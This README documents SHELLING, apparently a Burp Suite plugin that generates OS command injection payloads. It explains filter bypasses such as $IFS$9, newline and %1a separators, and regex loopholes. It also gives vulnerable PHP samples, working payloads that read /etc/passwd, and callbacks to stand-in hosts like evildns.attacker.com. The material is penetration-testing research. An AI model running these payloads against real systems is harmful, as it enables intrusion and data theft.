Original work by: Julian H. https://github.com/ewilded/shelling

# SHELLING - a comprehensive OS command injection payload generator (available in the Burp App Store as Command Injection Attacker).

![Logo](logo.png?raw=true)
# What is SHELLING?
This project revolves around detecting OS command and argument injection flaws (not limited to web applications). Its main objective is to generate a set of payloads capable of penetrating all improperly written sanitizers of user supplied input passed to OS shell overlay functions like `system()`, `shell_exec()` and the like.

It comes in the form of a Burp Suite plugin with the following main functionalities:
* Intruder payload provider
* Scanner extension
* Payload export to clipboard/file
* single byte generator

The plugin can be used with the free Burp Community version, with its inherent limitations.

# Purpose of this document
This documentation has two purposes:
* present tool's capabilities and usage
* provide the methodology and results of the OS command and argument injection research conducted for the needs of this project.


# Table of contents
* Methodology - identifying possible reasons of false negatives (missed vulnerabilities)
	* The syntax problem
	* The problem of input-sanitizing mechanisms
		* Bad characters
		* Regular expressions
	* Platform-specific conditions
	* The feedback channel
* Using the tool
	* Difference between manual mode vs auto
	* Modules
		* Scanner
		* Intruder
		* Export
		* Byte generator
	* Advanced and experimental settings
	* Different approaches to using this tool
	* Problems and future improvements

## Methodology - identifying possible reasons of false negatives (missed vulnerabilities)

Problems to face when creating OS command injection payloads:
* the eventual syntax of the expression we are injecting into (e.g. quoted expressions)
* input sanitizing mechanisms rejecting individual characters (e.g. spaces)
* platform-specific conditions (e.g. there is no "sleep" on windows)
* callback method (e.g. asynchronous execution, no outbound traffic allowed)

The purpose of creating this tool was to reach the non-trivial OS command injection cases, which stay undetected by generally known and used tools and sets of payloads. 


### The syntax problem

Let's consider the following vulnerable PHP script:
```
    <?php
    if(isset($_GET['username'])) echo shell_exec("echo '{$_GET['username']}'>>/tmp/users.txt");
    ?>
```
What makes this case different from the most common and obvious cases of OS command injection is the fact that the user-controlled variable is injected between single quotes in the final expression passed to the shell_exec function. Hence, one of the most obvious OS command injection test cases, like
`http://localhost/vuln.php?username=;cat /etc/passwd;` would result in the expression being evaluated to echo `';cat /etc/passwd;'`. 
So, instead of executing the command, the entire user input is written into the /tmp/users.txt file.

This particular payload leads to a false negative in this particular case, as it does not fit the target expression syntax in a way that would make shell_exec function treat it as a system command. Instead, the payload is still treated as an argument to the echo command.
In order to properly inject into this particular command, we need to jump out from the quoted expression in the first place. If we simply try payload like `';cat
/etc/passwd;`, the expression would evaluate to echo `'';cat /etc/passwd;'`, we would still get a false negative due to unmatched quoted string following the command we injected.

A payload fitting to this particular syntax should look like `';cat /etc/passwd;'`:
`http://localhost/vuln.php?username=%27;cat /etc/passwd;%27`, making the final expression to look like echo `'';cat /etc/passwd;''`.

And the output is (the injection is working):

    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin: [...]

This is just one of the examples of how the syntax of the target injectable expression affects the results. The solution to this problem is a good list of vulnerable syntax-varied cases, as we have to guess as many syntax-dependant cases as possible.
For the rest of this write-up, let’s use the following legend:

- OS_COMMAND = the name of the remote binary we want to execute, e.g. `ping`
- ARGUMENT = the argument of the command we want to execute, e.g.`collaborator.example.org`
- ARGUMENT_SEPARATOR = string between the OS_COMMAND and the ARGUMENT, e.g. ` ` (a space)
- FULL_COMMAND=`OS_COMMAND+ARGUMENT_SEPARATOR+ARGUMENT`
- COMMAND_SEPARATOR = a string that separates multiple commands from each other, required for successful injection in most cases (e.g. `&` or `|`)
- COMMAND_TERMINATOR = a sequence which, if injected into a string, enforces the remote system to ignore the remainder of that string (everything that follows the terminator), e.g. `#` on nix (bash) or '::' on win

So, the following list of syntax patterns was created:
- `FULL_COMMAND` - when command is directly injected into an expression
- `FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)` - when the command is directly injected into the beginning of the expression and then it is appended with some arguments/other commands
- `COMMAND_SEPARATOR + FULL_COMMAND` - when command is appended as an argument of a command hardcoded in the expression
- `COMMAND_SEPARATOR + FULL_COMMAND + COMMAND_SEPARATOR` - when the command is appended as an argument to a command hardcoded in the expression AND appended with some arguments/other commands

Additionally, all the above combinations need corresponding versions targeted at quoted expressions.
Single quotes:
- `'FULL_COMMAND'`
- `'FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)'`
- `'COMMAND_SEPARATOR + FULL_COMMAND'`
- `'COMMAND_SEPARATOR+ FULL_COMMAND + COMMAND_SEPARATOR'`

Double quotes:
- `“FULL_COMMAND”`
- `“FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND +COMMAND_SEPARATOR”`


### The problem of input-sanitizing mechanisms

#### Bad characters
As it is generally known, blacklist-based approach is a bad security practice. In most cases, sooner or later the attackers find a way around the finite defined list of payloads/characters that are forbidden. Instead of checking if the user-supplied value contains any of the bad things we predicted (e.g. `&` or `;` characters), it's safer to check whether that data looks like it should (e.g. matches a simple regex like `^\w+$` or `^\d+$`) before using it.

Many input-sanitizing functions attempt to catch all potentially dangerous characters that might give the attacker a way to control the target expression and, in consequence, execution.

##### Argument separators trickery
Let's consider the following example:
```
    <?php
    if(isset($_POST['dir'])&&!preg_match('/\s+/',$_POST['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_POST['dir']}");
    }
    ?>
```

The script executes the OS command only if the user-supplied variable does not contain any white characters (like spaces or tabs). This is why payloads like:
`cat /etc/passwd`
`;cat /etc/passwd;`
`';cat /etc/passwd;'`

lead to false negatives.

In order to execute an arbitrary command, we need an alternative expression to separate the command from its argument (we need an alternative ARGUMENT_SEPARATOR). 

A way to achieve this is an expression like `$IFS$9`, so the alternative payloads would be:
`cat$IFS$9/etc/passwd`
`;cat$IFS$9/etc/passwd;`
`';cat$IFS$9/etc/passwd;'`

In the unix environment, the `$IFS` environmental variable contains the current argument separator value (which is space by default).
Special caution needs to be taken when injecting `$IFS` as the argument separator. It is critical to make sure that the OS shell will be able to understand where does the variable name end and therefore where does the actual argument start. `ping$IFSlocalhost` will NOT work, because the shell will try to extrapolate a variable called `$IFSlocalhost` - which is obviously not defined. To deal with this, we can insert additional `$9`, which is just a holder of the ninth argument of the current system shell process (which is always an empty string). 
Interestingly, the same principle does not seem to apply to commands like `init$IFS$96` (init 6 -> restart). The command works fine and the shell is not trying to insert variable $96. Instead, it recognizes the presence of `$9`, evaluates it to an empty string and therefore treats the following `6` as an argument.
A way to avoid this confusion is to use the `${IFS}` bracketed expression - just keep in mind this involves the use of two more characters that are likely to be filtered `{` and `}`.


Below is the list of currently known and supported argument separators:
On nix:
- `%20` - space
- `%09` - horizontal tab
- `$IFS$9` - IFS terminated with 9th (empty) argument holder
- `{OS_COMMAND,ARGUMENT}` - the brace expression (works under bash, does not under dash)

More platform-specific tricks, like IFS override `;IFS=,;cat,/etc/passwd` or char escaping `X=$'cat\x20/etc/passwd'&&$X` will soon be supported as well.


On win:
- `%20` - space
- `%09` - horizontal tab
- `%0b` - vertical tab
- `%25ProgramFiles:~10,1%25` - a hacky cmd expression cutting out a space from the default setting of the %ProgramFiles% environmental variable (`C:\Program Files`)

The above is just an example of bypassing poorly written input-sanitizing function from the perspective of alternative argument separators. 


###### Command separators trickery
Achieving the ability of injecting arbitrary commands usually boils down to the ability of injecting valid command separators first.

Below is the list of working commmand separators:

On unix:
- `%0a` (new line character)
- `%0d` (carriage return character)
- `;`
- `&`
- `|`

On windows:
- `%0a` (new line character)
- `&`
- `|`
- `%1a` - a magical character working as a command separator in .bat files (discovered while researching cmd.exe to find alternative command separators - full description of the finding: http://seclists.org/fulldisclosure/2016/Nov/67)

##### More witchcraft
Also, what's very interesting on win is the fact that the semicolon `;` does NOT work as a command separator. 
This is very sad, because e.g. the `%PATH%` env variable usually looks more-less like this:
`C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;[...]`. 
Therefore it would be great to use an alternative command separator like `%PATH:~19,1%` (substring expression that cuts out the first `;`, so it evaluates to it) with payloads like `a%PATH:~19,1%nslookup%25ProgramFiles:~10,1%25evildns.attacker.com%PATH:~19,1%`, which would evaluate to `a;nslookup evildns.attacker.com;`.
Unfortunately the default environmental variables under Windows do not contain any supported command separator, like `&`. 
It WOULD work, here's why:

* ![Little test](screenshots/win_shellshock.png?raw=true "Little test")

* https://www.thesecurityfactory.be/command-injection-windows.html - the Windows version of the "shellshock" vuln :D

I am still hoping for some undocumented cmd.exe function that will allow to forge `&` by some sort of single expression. More research is needed.

By the way, I also really hoped for the similar thing to work on nix. E.g. the `$LS_COLORS` variable looks more-less like: `rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37[...]`.
Hence, I really hoped for expression like `ls .${LS_COLORS:10:1}id` to work (evaluating to `ls .;id` and treating `;` as a command separator). Unfortunately bash plays it safe and treats such a string as a literal:
`ls: cannot access '.;id': No such file or directory`. Who knows... More research is needed (especially with cmd.exe as it is not open source, but also on other shells like dash (and powershell!).


##### String separators
Additionally, the following string terminators can be used (in case input was written into a file or a database before execution and our goal was to get rid of everything appended to our payload in order to avoid syntax issues):
- `%00` (nullbyte)
- `%F0%9F%92%A9` (Unicode poo character, known to cause string termination in db software like MySQL)
- `%20#` - space followed by the hash sign

This way the base payload set is multiplied by all the feasible combinations of alternative argument separators, command separators and command terminators.

The above separators could include double characters (like two spaces or two tabs, one after another). This is idea for optimisation aimed at defeating improperly written filters which only cut out single instances of banned characters, instead of removing them all. In such case two characters would get reduced to one, bypassing the filter and hitting the vulnerable function.


#### Regular expressions

Some input sanitizers are based on regular expressions, checking if the user-supplied input does match the correct pattern (the good, whitelist approach, as opposed to a blacklist).
Still, a good approach can be improperly implemented, creating loopholes. A few examples below.

The following vulnerable PHP will refuse to execute any OS commands as long as the user-supplied input does not START with alphanumeric character/characters:
```
    <?php
    if(isset($_GET['dir'])&&preg_match('/\w+$/',$_GET['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>
```
This is why all of the previously discussed payloads would end up in false negatives. An example payload defeating this filter could be `foo;cat /etc/passwd`.

Another example's regular expression requires the user-supplied value to both start and end with alphanumeric characters:
```
    <?php
    if(isset($_GET['dir'])&&preg_match('/^\w+\..*\w+\.\w+$/',$_GET['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>
```

Due to the fact that it contains a lax the `.*` part in the middle, it is possible to defeat it with a payload starting and ending with an alphanumeric string, like `foo1.co.uk;cat /etc/passwd;foo2.co.uk`. In this case it does not matter that there is no such file as `foo1.co.uk` and that there is no such command as `foo2.co.uk`, what matters is that the command between these prefixes will execute properly. 
These two examples show that all the previously mentioned payloads also require alternatives with proper prefixes and/or suffixes, ideally taken from the original values used and expected by the application. In fact, these payloads (suffixed and prefixed) are the ones most likely to succeed, making their non-suffixed and non-prefixed versions redundant (this fact will be soon used in the best effort payloads feature - not implemented yet).
This makes us extend our base payload set to combinations like:
- `COMMAND_SEPARATOR+FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+FULL_COMMAND+SUFFIX`


### Platform-specific conditions

Depending on the technology we are dealing with, some payloads working on some systems will fail on other. The examples include:
- using windows-specific command on a nix-like system
- using nix-like specific argument separator on a windows system
- dealing with a different underlying system shell (e.g. `cat /etc/passwd #'` will work on bash/ash/dash, but won't work on csh)
- different filesystem PATH values

With this in mind, the best (and currently applied) approach is to use commands and syntaxes that work the same on all tested platforms (the most basic syntax of commands like echo and ping remains the same across nix/win). If this approach turns out not to be exhaustive, alternative base payloads need to be added to the test set.


### The problem of the feedback channel

All the above vulnerable scripts have two common features:
- they are synchronous, meaning that the script does not return any output as long as the command has not returned results, so it is synchronous with
our targeted function 
- they all return the target function's output, meaning that we could actually see the results of the issued commands on the web page.

This conditions are often untrue, especially the second one. So, let's deal with a script like:

```
    <?php
    if(isset($_GET['username']))
    {
    $out=@shell_exec("ls /home/{$_GET['username']}");
    file_put_contents('/var/www/user.lookups.txt',$out,FILE_APPEND);
    }
    ?>
```

The above script is synchronous, but does not return output. An alternative that would also be asynchronous would involve saving the command in some file/database entry and having it executed by another process within unknown time (e.g. a scheduled task). 
So, using all the variations of test commands like cat /etc/passwd or echo test would lead to false negatives, because the output is never returned to the browser.
This is why we need alternative feedback channels (which do not necessarily mean ouf of band channels - this terminology rather refers to the way of extracting data). 

A feedback channel is simply the way we collect the indicator of a successful injection.

Hence, for command injection, we can have the following feedback channels:
- directly returned output (all the above examples except the last one)
- response time (e.g. commands like sleep 30 will case noticeable half-minute delay, confirming that the injection was successful, however this will not work with asynchronous scripts)
- network traffic, like reverse HTTP connections (wget http://a.collaborator.example.org), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)
- file system (if we have access to it; we can attempt to inject commands like `touch /tmp/cmdinject` and then inspect the `/tmp` directory if the file was created - or have the customer to do it for us)
- availability (if all the above fails/is not an option, the only way (without involving third parties) to confirm that the injected command has executed, would be an injection of some sort of payload causing a DoS condition like reboot, shutdown or remove)

In order to avoid false negatives, when no command output is returned by the application, it is necessary to employ payloads utilizing a different feedback channel. Network, particularly DNS (watching for specific domain name lookups coming from the target - this is the main feedback channel usede by Burp Collaborator) is a very good choice, as DNS lookups are usually allowed when no other outbound traffic is permitted. Also, this option is great as it works as well with asynchronous injections.

### Features and usage

The following basic configuration options are available:
- `$COMMAND` - the name of the system binary to run, the default is `'ping'` (could be changed to echo, touch, wget - basically it depends on our preferred feedback channel)
- `$TARGET_OS` - the target operating system, possible values are `'win'`, `'nix'`, `'all'` (`'all'` is the default)
- `$ARGUMENT` - the argument for the command, depending on the feedback channel we want to utilize. The default is `'PAYLOAD_MARK.sub.evilcollab.org'`.
- `$payload_marking` - whether or not to use the payload marking (see below) - the default is '1' (yes).

The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload identifier (a natural number), so it is possible to track the correct payload if the attack was successful. A few examples:

- `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
- `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.





### Using the plugin
TBD tomorrow morning :D

### Case examples
#### 1) For example test cases (the number of all supported cases should be bigger than the total number of payloads generated) please refer to the test_cases directory
#### 2) Some real examples
- https://chris-young.net/2017/04/12/pentest-ltd-ctf-securi-tay-2017-walkthrough/
- https://www.exploit-db.com/exploits/41892/

